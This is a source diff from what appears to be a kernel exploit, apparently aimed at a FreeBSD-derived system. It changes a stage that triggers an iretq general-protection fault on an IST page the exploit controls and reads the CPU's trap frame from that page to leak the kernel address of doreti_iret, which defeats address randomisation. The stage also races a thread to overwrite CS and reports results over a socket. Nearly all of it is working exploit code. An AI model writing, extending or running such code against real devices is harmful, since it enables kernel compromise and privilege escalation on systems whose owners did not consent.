@@ -4603,22 +4603,35 @@ broad_done:
          * B) Non-canonical RIP → #GP(0)
          *
          * Both cause a fault AT the iretq instruction (doreti_iret).
-         * The IST-redirected exception handler uses our IST page;
-         * the writer thread races to overwrite CS with 0x43 so the
-         * kernel treats it as a user-mode fault and delivers a signal.
+         * The CPU pushes a trap frame onto our IST page via DMAP.
+         * The RIP field (page+0xFD8) = doreti_iret.
          *
-         * If setcontext returns (kernel rejected the context), we
-         * retry in a while loop.  sigsetjmp catches the signal
-         * handler's siglongjmp on success.
+         * Primary path: read doreti_iret directly from IST page after
+         * the fault returns to us (the kernel handles the fault at
+         * doreti_iret silently and resumes userspace at getcontext's
+         * save point).
+         *
+         * Secondary path: if the writer thread wins the CS race, the
+         * kernel delivers a signal and our handler captures mc_rip.
+         *
+         * Note: setcontext success jumps to getcontext's return point,
+         * bypassing the while-condition.  We enforce the limit with an
+         * explicit check after the counter increment.
          */
         send_response(sock, "\n7i. Triggering iretq fault (up to 50 attempts)...\n");
         {
             int max_attempts = 50;
             gp_trap_attempt_count = 0;
             gp_trap_sig_received = 0;
+            volatile uint8_t *istp = (volatile uint8_t *)ist_page;
+
+            /* Clear IST trap frame area (0xFD0..0xFFF) */
+            for (int i = 0xFD0; i < 0x1000; i++)
+                istp[i] = 0;
 
             if (sigsetjmp(gp_trap_jmp_env, 1) != 0) {
-                /* Returned from signal handler via siglongjmp */
+                /* Returned from signal handler via siglongjmp
+                 * (writer thread won the CS race) */
                 send_response(sock, "  attempt %d: signal %d (%s) caught! "
                               "mc_rip=0x%lx mc_cs=0x%lx mc_err=0x%lx\n",
                               (int)gp_trap_attempt_count,
@@ -4637,6 +4650,49 @@ broad_done:
 
                     if (gp_trap_got_result)
                         break;
+
+                    /* Enforce limit — setcontext bypasses while-cond */
+                    if (gp_trap_attempt_count > max_attempts)
+                        break;
+
+                    /* Check IST page for doreti_iret from a fault.
+                     * CPU pushes RIP at IST_top - 0x28 = page+0xFD8.
+                     * The value persists after the kernel handles the
+                     * fault and returns to us. */
+                    {
+                        uint64_t rip_val = *(volatile uint64_t *)(istp + 0xFD8);
+                        uint64_t cs_val  = *(volatile uint64_t *)(istp + 0xFE0);
+                        uint64_t err_val = *(volatile uint64_t *)(istp + 0xFD0);
+                        uint64_t fl_val  = *(volatile uint64_t *)(istp + 0xFE8);
+                        uint64_t rsp_val = *(volatile uint64_t *)(istp + 0xFF0);
+                        uint64_t ss_val  = *(volatile uint64_t *)(istp + 0xFF8);
+
+                        /* Dump IST frame for first 3 attempts */
+                        if (gp_trap_attempt_count <= 3) {
+                            send_response(sock,
+                                "  IST@%d: err=%lx RIP=%lx CS=%lx "
+                                "FL=%lx RSP=%lx SS=%lx\n",
+                                (int)gp_trap_attempt_count,
+                                err_val, rip_val, cs_val,
+                                fl_val, rsp_val, ss_val);
+                        }
+
+                        if (rip_val >= 0xFFFF800000000000ULL &&
+                            rip_val != 0xFFFFFFFFFFFFFFFFULL) {
+                            /* Found kernel address — this is doreti_iret */
+                            gp_trap_doreti_addr = rip_val;
+                            gp_trap_mc_cs  = cs_val;
+                            gp_trap_mc_err = err_val;
+                            gp_trap_got_result = 1;
+                            gp_trap_sig_received = -1; /* IST read */
+                            send_response(sock,
+                                "  attempt %d: IST page read: "
+                                "RIP=0x%lx CS=0x%lx err=0x%lx\n",
+                                (int)gp_trap_attempt_count,
+                                rip_val, cs_val, err_val);
+                            break;
+                        }
+                    }
 
                     const char *strategy;
                     if (gp_trap_attempt_count <= 25) {
@@ -4691,18 +4747,21 @@ broad_done:
                 send_response(sock,
                     "Confidence: HIGH (direct trap frame intercept)\n");
                 send_response(sock, "\nNotes:\n");
-                send_response(sock,
-                    "  Signal: %d (%s)  mc_cs=0x%lx mc_err=0x%lx\n",
-                    (int)gp_trap_sig_received,
-                    gp_trap_sig_received == SIGBUS ? "SIGBUS" :
-                    gp_trap_sig_received == SIGSEGV ? "SIGSEGV" : "?",
-                    (uint64_t)gp_trap_mc_cs, (uint64_t)gp_trap_mc_err);
-                if (gp_trap_sig_received == SIGSEGV)
+                if (gp_trap_sig_received == -1) {
                     send_response(sock,
-                        "  (SIGSEGV indicates kernel handled #GP normally "
-                        "via default IST; IST race still captured mc_rip)\n");
+                        "  Method: direct IST page read (no signal needed)\n"
+                        "  mc_cs=0x%lx mc_err=0x%lx\n",
+                        (uint64_t)gp_trap_mc_cs, (uint64_t)gp_trap_mc_err);
+                } else {
+                    send_response(sock,
+                        "  Signal: %d (%s)  mc_cs=0x%lx mc_err=0x%lx\n",
+                        (int)gp_trap_sig_received,
+                        gp_trap_sig_received == SIGBUS ? "SIGBUS" :
+                        gp_trap_sig_received == SIGSEGV ? "SIGSEGV" : "?",
+                        (uint64_t)gp_trap_mc_cs, (uint64_t)gp_trap_mc_err);
+                }
                 send_response(sock,
-                    "  Found via sleirsgoevy's IST #GP race technique\n");
+                    "  Found via sleirsgoevy's IST technique\n");
                 send_response(sock,
                     "  Phase 7c will redirect #DB to singlestep "
                     "through this instruction\n");
@@ -4780,17 +4839,27 @@ broad_done:
         } else {
             send_response(sock, "  No result after %d attempts\n",
                           (int)gp_trap_attempt_count);
-            if (gp_trap_sig_received)
+            if (gp_trap_sig_received > 0)
                 send_response(sock, "  Last signal received: %d (%s)\n",
                               (int)gp_trap_sig_received,
                               gp_trap_sig_received == SIGBUS ? "SIGBUS" :
                               gp_trap_sig_received == SIGSEGV ? "SIGSEGV" : "?");
             else
+                send_response(sock, "  No signal received\n");
+
+            /* Dump final IST page state for diagnostics */
+            if (ist_page) {
+                volatile uint8_t *istp2 = (volatile uint8_t *)ist_page;
                 send_response(sock,
-                    "  No signal received at all — possible causes:\n"
-                    "    - Thread running on CPU whose TSS was not modified\n"
-                    "    - Writer thread timing issue\n"
-                    "    - Kernel handles #GP without delivering signal\n");
+                    "  Final IST frame: err=%lx RIP=%lx CS=%lx "
+                    "FL=%lx RSP=%lx SS=%lx\n",
+                    *(volatile uint64_t *)(istp2 + 0xFD0),
+                    *(volatile uint64_t *)(istp2 + 0xFD8),
+                    *(volatile uint64_t *)(istp2 + 0xFE0),
+                    *(volatile uint64_t *)(istp2 + 0xFE8),
+                    *(volatile uint64_t *)(istp2 + 0xFF0),
+                    *(volatile uint64_t *)(istp2 + 0xFF8));
+            }
         }
 
     step7_cleanup:
